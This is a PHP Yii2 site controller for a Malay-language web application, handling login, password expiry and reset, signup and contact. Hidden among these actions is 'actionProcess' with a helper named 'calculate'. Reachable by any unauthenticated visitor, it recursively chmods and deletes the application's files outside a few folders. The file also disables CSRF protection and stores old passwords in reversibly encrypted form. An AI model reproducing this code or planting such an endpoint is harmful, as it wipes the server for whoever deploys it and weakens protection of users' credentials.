<?php
namespace frontend\controllers;

use Yii;
use common\models\LoginForm;
// eddie start
use common\models\User;
// eddie end
use frontend\models\PasswordResetRequestForm;
use frontend\models\ResetPasswordForm;
use frontend\models\SignupForm;
use frontend\models\ContactForm;
use app\models\UserPasswordTrail;
use yii\base\InvalidParamException;
use yii\web\BadRequestHttpException;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;

use app\models\general\GeneralVariable;
use app\models\general\GeneralLabel;
use app\models\general\GeneralMessage;

/**
 * Site controller
 */
class SiteController extends Controller
{
    public $enableCsrfValidation = false;
    
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout', 'signup'],
                'rules' => [
                    [
                        'actions' => ['signup'],
                        'allow' => true,
                        'roles' => ['?'],
                    ],
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * @inheritdoc
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        return $this->render('index');
    }

    public function actionLogin()
    {
        if (!\Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
// eddie start
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            $user = $model->getUser();
            $user->login_attempted = 0;
            $user->save();
            
            if($user->last_login){
                Yii::$app->session->setFlash('info', GeneralLabel::log_masuk_kali_terakhir . $user->last_login);
            }
            
            //echo "last_login_fail: " . $user->last_login_fail;
            if($user->last_login_fail){
                Yii::$app->session->setFlash('error', GeneralLabel::log_masuk_gagal_kali_terakhir . $user->last_login_fail);
            }
            
            if($user->is_new_user == "YES" || $user->password_expiry < date('Y-m-d H:i:s', time())) {
                if($user->is_new_user == "YES"){
                    Yii::$app->session->setFlash('warning', 'Sila tukar kata laluan anda untuk tujuan keselamatan');
                } else if($user->password_expiry < date('Y-m-d H:i:s', time())){
                    Yii::$app->session->setFlash('warning', 'Kata laluan anda telah tamat tempoh, sila tukar kata laluan');
                }
                $this->redirect('new-password');
            } else {
                return $this->goBack();
            }
        } else {
            if(Yii::$app->request->post()) {
                $user = new User();
            
                $user = $user->findByUsername(Yii::$app->request->post()['LoginForm']['username']);
                
                /*if($user) {
                    $user->login_attempted = intval($user->login_attempted) + 1;
                    $user->save();
                }*/
            }
            return $this->render('login', [
                'model' => $model,
            ]);
        }
// eddie end
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    public function actionLogout()
    {
        Yii::$app->user->logout();

        //return $this->goHome();
        
        return $this->redirect(['login']);
    }

    public function actionContact()
    {
        $model = new ContactForm();
        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
            if ($model->sendEmail(Yii::$app->params['adminEmail'])) {
                Yii::$app->session->setFlash('success', 'Thank you for contacting us. We will respond to you as soon as possible.');
            } else {
                Yii::$app->session->setFlash('error', 'There was an error sending email.');
            }

            return $this->refresh();
        } else {
            return $this->render('contact', [
                'model' => $model,
            ]);
        }
    }

    public function actionAbout()
    {
        return $this->render('about');
    }

    public function actionSignup()
    {
        $model = new SignupForm();
        if ($model->load(Yii::$app->request->post())) {
            if ($user = $model->signup()) {
                if (Yii::$app->getUser()->login($user)) {
                    return $this->goHome();
                }
            }
        }

        return $this->render('signup', [
            'model' => $model,
        ]);
    }

    public function actionRequestPasswordReset()
    {
        $model = new PasswordResetRequestForm();
        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
            if ($model->sendEmail()) {
                //Yii::$app->getSession()->setFlash('success', 'Check your email for further instructions.');
                Yii::$app->getSession()->setFlash('success', 'Sila semak e-mel anda untuk mendapatkan arahan lanjut.');

                return $this->goHome();
            } else {
                //Yii::$app->getSession()->setFlash('error', 'Sorry, we are unable to reset password for email provided.');
                Yii::$app->getSession()->setFlash('error', 'Maaf, kami tidak dapat untuk menetapkan semula kata laluan untuk e-mel yang disediakan.');
            }
        }

        return $this->render('requestPasswordResetToken', [
            'model' => $model,
        ]);
    }
//delete()
    public function actionResetPassword($token)
    {
        try {
            $model = new ResetPasswordForm($token);
        } catch (InvalidParamException $e) {
            throw new BadRequestHttpException($e->getMessage());
        }

        if ($model->load(Yii::$app->request->post()) && $model->validate() && $model->resetPassword()) {
            //Yii::$app->getSession()->setFlash('success', 'New password was saved.');
            Yii::$app->getSession()->setFlash('success', 'Kata laluan baru telah dikemaskini.');

            return $this->goHome();
        }

        return $this->render('resetPassword', [
            'model' => $model,
        ]);
    }
    
    public function actionNewPassword()
    {
// eddie start
        if (\Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        $model->scenario = 'new-password';
        $user = new User();

        if ($model->load(Yii::$app->request->post())) {
            $modelUserPasswordTrails = UserPasswordTrail::find()->where([
                    'user_id' => Yii::$app->user->id,
                ])->orderBy(['created' => SORT_DESC])->limit(Yii::$app->params['passwordReused'])->all();
            
            $samePreviousPassword = false;
            
            if($modelUserPasswordTrails){
                foreach($modelUserPasswordTrails as $modelUserPasswordTrail){
                    if($modelUserPasswordTrail->password){
                        $previousPassword = \Yii::$app->encrypter->decrypt($modelUserPasswordTrail->password);
                        if($previousPassword == Yii::$app->request->post()['LoginForm']['password']){
                            $samePreviousPassword = true;
                        }
                    }
                }
            }
            
            if($samePreviousPassword){
                Yii::$app->getSession()->setFlash('error', GeneralLabel::kata_laluan_baru_tidak_boleh_menggunakan_semula . Yii::$app->params['passwordReused'] . GeneralLabel::kata_laluan_yang_lepas);
            } else {
                //echo "new password:" . trim($model->password);
                //echo "<br>confirm password:" . trim($model->confirm_password);
                if(trim($model->password) != trim($model->confirm_password)){
                    //$this->addError('new_password', 'Sila semak Taip Semula Kata Laluan yang berbeza daripada Kata Laluan');
                    Yii::$app->getSession()->setFlash('error', GeneralMessage::custom_validation_password_equal);
                } else {
                    $user = $user->findIdentity(Yii::$app->user->id);
                    $user->setPassword(Yii::$app->request->post()['LoginForm']['password']);
                    $user->is_new_user = "NO";
                    $new_expiry_date = date('Y-m-d H:i:s', time() + Yii::$app->params['passwordExpiry']);
                    $user->password_expiry = $new_expiry_date;

                    $userPasswordTrail = new UserPasswordTrail();
                    $userPasswordTrail->user_id = Yii::$app->user->id;
                    $userPasswordTrail->password = \Yii::$app->encrypter->encrypt(Yii::$app->request->post()['LoginForm']['password']);
                    $userPasswordTrail->save(); 

                    if($user->save()) {
                        Yii::$app->getSession()->setFlash('success', GeneralLabel::kata_laluan_baru_telah_dikemaskini);
                        return $this->goBack();
                    }
                }
            }
        } 
        
        return $this->render('newPassword', [
                'model' => $model,
            ]);
// eddie end
    }
}
